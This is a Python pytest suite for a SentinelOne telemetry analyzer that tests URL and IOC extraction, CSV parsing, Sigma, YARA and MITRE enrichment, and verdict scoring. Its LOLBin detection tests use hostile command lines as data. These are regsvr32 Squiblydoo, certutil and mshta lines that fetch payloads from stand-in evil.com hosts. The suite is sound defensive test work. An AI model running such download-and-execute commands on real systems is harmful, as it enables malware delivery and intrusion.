"""
Regression tests for s1_analyzer.py.

Not a golden-JSON diff suite (the tool has no prior test baseline and several
bugs were fixed in this pass) — instead these lock in invariants that must
hold regardless of implementation details: pure-function correctness on
adversarial input, and structural guarantees of a full analyze() run against
the real sample CSVs already checked into this repo.

Run from the repo root: pytest tests/ -v
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import s1_analyzer as s1  # noqa: E402

REPO_ROOT = Path(__file__).resolve().parent.parent
SAMPLE_CSV = REPO_ROOT / "A_Analyser" / "RzSDKService.csv"


# ─────────────────────────────────────────────────────────────────────────
# URL cleaning / IOC extraction (s1_analyzer.py:_clean_url, _refang, etc.)
# ─────────────────────────────────────────────────────────────────────────

class TestCleanUrl:
    def test_strips_trailing_sentence_punctuation(self):
        assert s1._clean_url("https://evil.com/a.") == "https://evil.com/a"
        assert s1._clean_url("https://evil.com/a,") == "https://evil.com/a"

    def test_preserves_legitimate_comma_in_query(self):
        # commas are valid RFC 3986 sub-delims — must not be stripped mid-URL
        u = "https://evil.com/path?a=1,2,3"
        assert s1._clean_url(u) == u

    def test_preserves_balanced_parens(self):
        u = "https://evil.com/path(v2)/payload.exe"
        assert s1._clean_url(u) == u

    def test_strips_unbalanced_trailing_paren(self):
        assert s1._clean_url("https://evil.com/a)") == "https://evil.com/a"

    def test_truncates_at_shell_quote_breakout(self):
        # regression: PowerShell array literal like @('https://host/p','0',...)
        u = "https://host/p','0','C:\\\\Windows"
        assert s1._clean_url(u) == "https://host/p"

    def test_rejects_hostless_stub(self):
        assert s1._clean_url("http://") == ""
        assert s1._clean_url("https://a") == ""

    def test_empty_input(self):
        assert s1._clean_url("") == ""
        assert s1._clean_url(None) == ""

    def test_refangs_hxxp(self):
        assert s1._clean_url("hxxps://evil[.]com/a") == "https://evil.com/a"


class TestRefang:
    def test_defang_patterns(self):
        assert s1._refang("hxxp://evil.com") == "http://evil.com"
        assert s1._refang("evil[.]com") == "evil.com"
        assert s1._refang("evil(dot)com") == "evil.com"
        assert s1._refang("evil[dot]com") == "evil.com"


class TestExtractUrlsFromText:
    def test_finds_plain_and_defanged(self):
        text = "payload at https://evil.com/a and hxxp://bad[.]com/b then done."
        urls = s1._extract_urls_from_text(text)
        assert "https://evil.com/a" in urls
        assert "http://bad.com/b" in urls

    def test_dedup_preserves_order(self):
        text = "https://a.com/x https://a.com/x https://b.com/y"
        assert s1._extract_urls_from_text(text) == ["https://a.com/x", "https://b.com/y"]

    def test_no_urls(self):
        assert s1._extract_urls_from_text("nothing here") == []
        assert s1._extract_urls_from_text("") == []


class TestNormalizeUrlKey:
    def test_case_insensitive_scheme_host(self):
        a = s1._normalize_url_key("HTTPS://Evil.COM/Path?X=1")
        b = s1._normalize_url_key("https://evil.com/Path?X=1")
        assert a == b
        # path/query case is preserved (only scheme+host are lowered)
        assert "Path?X=1" in a


# ─────────────────────────────────────────────────────────────────────────
# EventParser — SentinelOne event.details key=value / MITRE HTML parsing
# ─────────────────────────────────────────────────────────────────────────

class TestEventParser:
    def test_simple_kv_pairs(self):
        d = s1.EventParser.parse("[src.process.cmdline=cmd.exe /c dir src.process.publisher=Microsoft]")
        assert d["src.process.cmdline"] == "cmd.exe /c dir"
        assert d["src.process.publisher"] == "Microsoft"

    def test_quoted_value_with_spaces(self):
        d = s1.EventParser.parse('[src.process.cmdline="C:\\Program Files\\app.exe -x" src.process.publisher=Foo]')
        assert d["src.process.cmdline"] == "C:\\Program Files\\app.exe -x"

    def test_empty_input(self):
        assert s1.EventParser.parse("") == {}
        assert s1.EventParser.parse(None) == {}


# ─────────────────────────────────────────────────────────────────────────
# CsvParser — line reconstruction, timestamp parsing, schema validation
# ─────────────────────────────────────────────────────────────────────────

class TestCsvParserReconstructLines:
    def test_single_line_untouched(self):
        assert s1.CsvParser._reconstruct_lines("a,b,c") == ["a,b,c"]

    def test_multiline_quoted_field_rejoined(self):
        content = 'a,"b\nstill b",c'
        assert s1.CsvParser._reconstruct_lines(content) == ['a,"b still b",c']


class TestCsvParserTimestamp:
    def test_dv_format(self):
        ts = s1.CsvParser._parse_ts("Mar 6, 2026 7:46:04 PM")
        assert ts is not None and ts.year == 2026 and ts.month == 3

    def test_iso_format(self):
        ts = s1.CsvParser._parse_ts("2026-03-06T19:46:04.000Z")
        assert ts is not None and ts.hour == 19

    def test_unparseable_returns_none(self):
        assert s1.CsvParser._parse_ts("not a date") is None


class TestCsvParserSchemaValidation:
    def test_missing_columns_warns(self, tmp_path):
        csv_path = tmp_path / "bad.csv"
        csv_path.write_text("foo,bar\nval1,val2\n", encoding="utf-8")
        events = s1.CsvParser.parse_file(str(csv_path))
        assert events == []
        assert any("missing expected column" in w for w in s1.CsvParser.last_warnings)

    def test_well_formed_dv_csv_no_warnings(self):
        assert SAMPLE_CSV.exists(), "sample fixture missing"
        events = s1.CsvParser.parse_file(str(SAMPLE_CSV))
        assert len(events) > 0
        assert s1.CsvParser.last_warnings == []

    def test_row_skip_counter(self, tmp_path):
        csv_path = tmp_path / "partial.csv"
        csv_path.write_text(
            "event.time,agent.uuid,src.process.user,event.type,"
            "src.process.storyline.id,event.details\n"
            '"Mar 6, 2026 7:46:04 PM",u1,user,Process Creation,s1,[a=b]\n'
            ",,,,,\n",  # missing event.time -> skipped
            encoding="utf-8",
        )
        events = s1.CsvParser.parse_file(str(csv_path))
        assert len(events) == 1
        assert s1.CsvParser.last_rows_skipped == 1
        assert s1.CsvParser.last_rows_total == 2


# ─────────────────────────────────────────────────────────────────────────
# SigmaEvaluator — event-type index must select the same rules the old
# unindexed per-rule CATEGORY_MAP check would have (behavior-preserving
# optimization: same candidates, just not O(all rules) per event).
# ─────────────────────────────────────────────────────────────────────────

class TestSigmaEvaluatorIndex:
    def test_every_rule_indexed_exactly_once_per_bucket_or_unfiltered(self):
        sigma = s1.SigmaEvaluator()
        if not sigma.available:
            import pytest
            pytest.skip("Sigma rules not present in data/sigma/rules")
        indexed_rule_ids = set()
        for rules in sigma._by_etype.values():
            for r in rules:
                indexed_rule_ids.add(id(r))
        unfiltered_ids = {id(r) for r in sigma._unfiltered}
        # Every loaded rule must be reachable from at least one bucket.
        all_ids = {id(r) for r in sigma._rules}
        assert (indexed_rule_ids | unfiltered_ids) >= all_ids

    def test_unfiltered_rules_match_declared_empty_or_unmapped_categories(self):
        sigma = s1.SigmaEvaluator()
        if not sigma.available:
            import pytest
            pytest.skip("Sigma rules not present in data/sigma/rules")
        for r in sigma._unfiltered:
            cat = r.get("_cat", "")
            ets = sigma.CATEGORY_MAP.get(cat)
            assert not ets  # either unmapped (None) or explicitly empty set

    def test_evaluate_event_only_returns_candidates_relevant_to_etype(self):
        sigma = s1.SigmaEvaluator()
        if not sigma.available:
            import pytest
            pytest.skip("Sigma rules not present in data/sigma/rules")
        ev = {"event_type": "Process Creation",
              "details": {"src.process.cmdline": "cmd.exe /c whoami"}}
        # Must not raise, must return a list (possibly empty)
        hits = sigma.evaluate_event(ev)
        assert isinstance(hits, list)


# ─────────────────────────────────────────────────────────────────────────
# MitreAttackEnricher — tid index gives identical results to a full scan
# ─────────────────────────────────────────────────────────────────────────

class TestMitreAttackEnricher:
    def test_known_technique_lookup(self):
        enricher = s1.MitreAttackEnricher()
        if not enricher.available:
            import pytest
            pytest.skip("ATT&CK bundle not present in data/attack/")
        info = enricher.get_technique_info("T1055")  # Process Injection
        assert info != {}
        assert "detection" in info

    def test_unknown_technique_returns_empty(self):
        enricher = s1.MitreAttackEnricher()
        if not enricher.available:
            import pytest
            pytest.skip("ATT&CK bundle not present in data/attack/")
        assert enricher.get_technique_info("T9999.999") == {}

    def test_index_built_covers_lookup_result(self):
        enricher = s1.MitreAttackEnricher()
        if not enricher.available:
            import pytest
            pytest.skip("ATT&CK bundle not present in data/attack/")
        assert "T1055" in enricher._tid_index


# ─────────────────────────────────────────────────────────────────────────
# YaraAnalyzer._load_monolithic — a public rule referencing a `private rule`
# helper defined elsewhere in the same file must still compile when the
# individual-compile fallback kicks in (regression: previously only the
# rule's own chunk was compiled, dropping any private dependency and
# failing with "undefined identifier" even though the rule itself was fine).
# ─────────────────────────────────────────────────────────────────────────

class TestYaraMonolithicPrivateRuleDependency:
    def _make_analyzer(self, src, tmp_path):
        import pytest
        if not s1.HAS_YARA:
            pytest.skip("yara-python not installed")
        yar = tmp_path / "test.yar"
        yar.write_text(src, encoding="utf-8")
        ya = s1.YaraAnalyzer.__new__(s1.YaraAnalyzer)
        ya._rule_sets = {}
        ya._hits = []
        ya._file_count = 0
        ya.rule_errors = 0
        ya.rule_error_samples = []
        return ya, yar

    def test_public_rule_gets_its_private_dependency(self, tmp_path):
        # bad_rule forces the whole-batch compile to fail (undefined "pe"
        # module in this bare compile context), triggering the per-rule
        # fallback that used to drop cross-rule private dependencies.
        src = (
            "rule bad_rule { condition: pe.number_of_signatures > 0 }\n\n"
            "private rule Chunk_PRIVATE { condition: true }\n\n"
            "rule Depends_On_Private { condition: Chunk_PRIVATE and true }\n"
        )
        ya, yar = self._make_analyzer(src, tmp_path)
        ya._load_monolithic(yar)
        assert "Chunk_PRIVATE" in ya._rule_sets
        assert "Depends_On_Private" in ya._rule_sets
        assert ya.rule_errors == 1  # only bad_rule should fail
        assert any("bad_rule" in s for s in ya.rule_error_samples)

    def test_unrelated_broken_private_rule_does_not_poison_others(self, tmp_path):
        # A private rule that is itself broken (and irrelevant to
        # Depends_On_Unrelated) must not be pulled in and cause a spurious
        # failure — only textually-referenced private rules are included.
        src = (
            "rule bad_rule { condition: pe.number_of_signatures > 0 }\n\n"
            "private rule Broken_PRIVATE { condition: pe.number_of_signatures > 0 }\n\n"
            "rule Depends_On_Unrelated { condition: true }\n"
        )
        ya, yar = self._make_analyzer(src, tmp_path)
        ya._load_monolithic(yar)
        assert "Depends_On_Unrelated" in ya._rule_sets


# ─────────────────────────────────────────────────────────────────────────
# VerdictEngine evidentiary-provenance tracking (_tp/_fp/_add_score) — the
# tool must stay blind to SentinelOne's own verdict (see project memory:
# feeding S1's classification into the tool would create anchoring bias),
# so the only way to know how independent a verdict actually is is to track
# which of OUR OWN checks produced each point of score. These tests build a
# bare VerdictEngine (bypassing __init__, which requires ~10 collaborator
# analyzers) to test the tracking mechanism itself in isolation.
# ─────────────────────────────────────────────────────────────────────────

def _bare_verdict_engine():
    v = s1.VerdictEngine.__new__(s1.VerdictEngine)
    v.score = 0
    v.evidence_tp = []
    v.evidence_fp = []
    v.observations = []
    v.score_by_source = {"s1_indicators": 0, "independent": 0}
    v._evidence_tp_sources = []
    v._evidence_fp_sources = []
    v.n_critical = 0
    v.n_high = 0
    v.n_critical_s1 = 0
    v.n_critical_independent = 0
    v.n_high_s1 = 0
    v.n_high_independent = 0
    return v


def _mkev(cmdline, field="src.process.cmdline"):
    return {"details": {field: cmdline}, "event_type": "Process Creation", "timestamp_raw": "x"}


class TestCmdlineAnalyzerLolbins:
    def test_benign_lolbin_usage_not_flagged(self):
        events = [_mkev("rundll32.exe shell32.dll,Control_RunDLL")]
        ca = s1.CmdlineAnalyzer(events)
        assert ca.get_findings() == []

    def test_non_lolbin_executable_not_flagged(self):
        events = [_mkev(r"C:\Windows\System32\notepad.exe file.txt")]
        ca = s1.CmdlineAnalyzer(events)
        assert ca.get_findings() == []

    def test_rundll32_javascript_flagged_critical(self):
        events = [_mkev('rundll32.exe javascript:eval("evil")')]
        ca = s1.CmdlineAnalyzer(events)
        findings = ca.get_findings()
        assert len(findings) == 1
        assert findings[0]["severity"] == "CRITIQUE"
        assert findings[0]["mitre"] == "T1218.011"
        assert findings[0]["description"].startswith("[LOLBIN]")

    def test_regsvr32_squiblydoo_flagged(self):
        events = [_mkev("regsvr32.exe /s /n /u /i:http://evil.com/p.sct scrobj.dll")]
        ca = s1.CmdlineAnalyzer(events)
        findings = ca.get_findings()
        severities = {f["severity"] for f in findings}
        assert "CRITIQUE" in severities  # the /i:http indicator
        assert all(f["mitre"] == "T1218.010" for f in findings)

    def test_certutil_download_flagged(self):
        events = [_mkev("certutil.exe -urlcache -split -f http://evil.com/p.exe out.exe")]
        ca = s1.CmdlineAnalyzer(events)
        findings = ca.get_findings()
        assert len(findings) == 1
        assert findings[0]["severity"] == "CRITIQUE"
        assert findings[0]["mitre"] == "T1140"

    def test_findings_flow_into_verdict_as_independent(self):
        # Confirms LOLBin findings reach VerdictEngine via _check_cmdline
        # and are tagged as independently-derived, not S1-derived.
        events = [_mkev('mshta.exe http://evil.com/payload.hta')]
        ca = s1.CmdlineAnalyzer(events)
        v = _bare_verdict_engine()
        v._check_cmdline(ca)
        assert v.score > 0
        assert v.score_by_source["independent"] > 0
        assert v.score_by_source["s1_indicators"] == 0
        assert any("LOLBIN" in e for e in v.evidence_tp)


class TestVerdictEngineProvenance:
    def test_tp_updates_score_and_source_breakdown(self):
        v = _bare_verdict_engine()
        v._tp(4, "independent", "[SIGMA CRITICAL] test rule")
        assert v.score == 4
        assert v.score_by_source == {"s1_indicators": 0, "independent": 4}
        assert v.evidence_tp == ["[SIGMA CRITICAL] test rule"]
        assert v._evidence_tp_sources == ["independent"]

    def test_severity_critical_counted_regardless_of_source(self):
        v = _bare_verdict_engine()
        # Independent-only critical evidence (no S1 indicator involved at all)
        v._tp(4, "independent", "[YARA CRITIQUE] malware.exe", severity="critical")
        v._tp(3, "independent", "[SIGMA CRITICAL] mimikatz pattern", severity="critical")
        assert v.n_critical == 2
        assert v.n_critical_independent == 2
        assert v.n_critical_s1 == 0
        # This is the actual bug fix: has_critical must be true from
        # independent evidence alone, without any S1 behavioral indicator.
        has_critical = v.n_critical >= 1
        assert has_critical is True

    def test_s1_derived_and_independent_critical_tracked_separately(self):
        v = _bare_verdict_engine()
        v._tp(5, "s1_indicators", "[CRITICAL] ProcessHollowing: ...", severity="critical")
        v._tp(4, "independent", "[LSASS] Direct LSASS access", severity="critical")
        assert v.n_critical == 2
        assert v.n_critical_s1 == 1
        assert v.n_critical_independent == 1

    def test_fp_can_reduce_score_and_is_tracked(self):
        v = _bare_verdict_engine()
        v._tp(5, "independent", "finding")
        v._fp(-2, "independent", "trusted publisher")
        assert v.score == 3
        assert v.score_by_source["independent"] == 3
        assert v.evidence_fp == ["trusted publisher"]
        assert v._evidence_fp_sources == ["independent"]

    def test_add_score_affects_total_without_evidence_entry(self):
        v = _bare_verdict_engine()
        v._add_score(2, "s1_indicators")
        assert v.score == 2
        assert v.score_by_source["s1_indicators"] == 2
        assert v.evidence_tp == []  # no evidence line for observation-only findings

    def test_high_severity_counted_separately_from_critical_by_source(self):
        # Regression: a verdict can reach "High" confidence via >=3
        # critical-or-high findings (has_multiple_high) with zero CRITICAL
        # findings at all. confidence_basis must describe that case using
        # the high-severity counts, not only the critical ones, or it
        # contradicts a "High confidence" verdict with "no strong finding".
        v = _bare_verdict_engine()
        v._tp(2, "s1_indicators", "[HIGH] IndicatorA", severity="high")
        v._tp(2, "s1_indicators", "[HIGH] IndicatorB", severity="high")
        v._tp(2, "independent", "[SIGMA HIGH] RuleX", severity="high")
        assert v.n_critical == 0
        assert v.n_high == 3
        assert v.n_high_s1 == 2
        assert v.n_high_independent == 1
        has_multiple_high = (v.n_critical + v.n_high) >= 3
        assert has_multiple_high is True
        # A correct confidence_basis implementation must report BOTH
        # sources contributed strong (critical-or-high) findings here.
        strong_independent = v.n_critical_independent + v.n_high_independent
        strong_s1 = v.n_critical_s1 + v.n_high_s1
        assert strong_independent == 1 and strong_s1 == 2


# ─────────────────────────────────────────────────────────────────────────
# End-to-end smoke test — full analyze() pipeline on a real sample CSV
# ─────────────────────────────────────────────────────────────────────────

class TestScenarioNarrator:
    """ScenarioNarrator must build its narrative/timeline purely from raw
    telemetry (process/network/files/registry/tasks/scripts/cmdlines/LSASS)
    and never consult BehaviorAnalyzer/S1's own indicators — see
    project memory on evidentiary independence."""

    def _narrator_for(self, events):
        proc = s1.ProcessAnalyzer(events)
        net = s1.NetworkAnalyzer(events)
        files = s1.FileAnalyzer(events)
        reg = s1.RegistryAnalyzer(events)
        tasks = s1.TaskAnalyzer(events)
        scripts = s1.ScriptAnalyzer(events)
        cmdline_an = s1.CmdlineAnalyzer(events)
        lsass = s1.LsassAnalyzer(events)
        return s1.ScenarioNarrator(proc, net, files, reg, tasks, scripts, cmdline_an, lsass)

    def test_empty_events_produce_empty_timeline_and_fallback_narrative(self):
        narrator = self._narrator_for([])
        assert narrator.build_timeline() == []
        assert "No independent scenario" in narrator.build_narrative()

    def test_lolbin_cmdline_produces_script_payload_phase(self):
        events = [_mkev('mshta.exe http://evil.com/payload.hta')]
        narrator = self._narrator_for(events)
        timeline = narrator.build_timeline()
        phases = {p["phase"] for p in timeline}
        assert "Script & Payload Activity" in phases

    def test_real_sample_produces_valid_structure(self):
        assert SAMPLE_CSV.exists(), "sample fixture missing"
        events = s1.CsvParser.parse_file(str(SAMPLE_CSV))
        narrator = self._narrator_for(events)
        timeline = narrator.build_timeline()
        for phase in timeline:
            assert phase["phase"] in s1.ScenarioNarrator.PHASE_ORDER
            assert phase["fact_count"] == len(phase["facts"])
            for f in phase["facts"]:
                assert isinstance(f["fact"], str) and f["fact"]
        narrative = narrator.build_narrative()
        assert isinstance(narrative, str) and narrative

    def test_narrative_never_mentions_s1_only_when_raw_evidence_exists(self):
        # If raw telemetry yields at least one phase, the narrative must be
        # built from it, not the "no scenario" fallback.
        events = [_mkev("certutil.exe -urlcache -split -f http://evil.com/p.exe out.exe")]
        narrator = self._narrator_for(events)
        narrative = narrator.build_narrative()
        assert "No independent scenario" not in narrative
        assert "certutil" in narrative.lower()


class TestAnalyzeEndToEnd:
    def test_full_pipeline_produces_valid_report(self):
        assert SAMPLE_CSV.exists(), "sample fixture missing"
        data = s1.analyze(str(SAMPLE_CSV), output_report=True)

        # Structural invariants
        for section in ("meta", "identification", "data_quality", "verdict",
                         "metrics", "behavioral_indicators", "mitre_attack",
                         "sigma_matches", "ioc_extraction", "kill_chain",
                         "scenario_reconstruction"):
            assert section in data, f"missing JSON section: {section}"

        sr = data["scenario_reconstruction"]
        assert isinstance(sr["narrative"], str) and sr["narrative"]
        assert isinstance(sr["timeline"], list)

        v = data["verdict"]
        score = v["score"]
        assert isinstance(score, int)
        assert 0 <= score <= 20

        assert isinstance(data["data_quality"], dict)
        assert data["data_quality"]["csv_warnings"] == []

        # Evidentiary-provenance invariants (see TestVerdictEngineProvenance)
        cb = v["contribution_breakdown"]
        assert cb["s1_indicators_points"] + cb["independent_points"] == v["raw_score"]
        assert len(v["evidence_tp"]) == len(v["evidence_tp_sources"])
        assert len(v["evidence_fp"]) == len(v["evidence_fp_sources"])
        assert set(v["evidence_tp_sources"]) <= {"s1_indicators", "independent"}
        assert v["confidence_basis"]  # always a non-empty explanation string

    def test_high_confidence_basis_never_claims_no_strong_finding(self):
        # Regression for the bug found live on bypass.csv: a verdict reaching
        # "High" confidence via the has_multiple_high (>=3 high-severity,
        # zero critical) path must not report confidence_basis as "no single
        # strong finding" — that combination is self-contradictory.
        bypass_csv = REPO_ROOT / "bypass.csv"
        if not bypass_csv.exists():
            import pytest
            pytest.skip("bypass.csv sample not present")
        data = s1.analyze(str(bypass_csv), output_report=True)
        v = data["verdict"]
        if v["confidence"] == "High":
            assert "no single strong finding" not in v["confidence_basis"]
            cb = v["contribution_breakdown"]
            total_strong = (cb["critical_findings_s1"] + cb["critical_findings_independent"]
                             + cb["high_findings_s1"] + cb["high_findings_independent"])
            assert total_strong >= 1

    def test_html_generation_does_not_raise(self):
        import s1_report
        assert SAMPLE_CSV.exists(), "sample fixture missing"
        data = s1.analyze(str(SAMPLE_CSV), output_report=True)
        html = s1_report.generate_html(data)
        assert "<html" in html
        assert "const DATA = " in html
        # XSS regression guard: the injected JSON blob must never carry a
        # literal </script> (or <, >, &) that could break out of the tag.
        payload_start = html.index("const DATA = ") + len("const DATA = ")
        payload_end = html.index(";\n", payload_start)
        payload = html[payload_start:payload_end]
        assert "<" not in payload and ">" not in payload
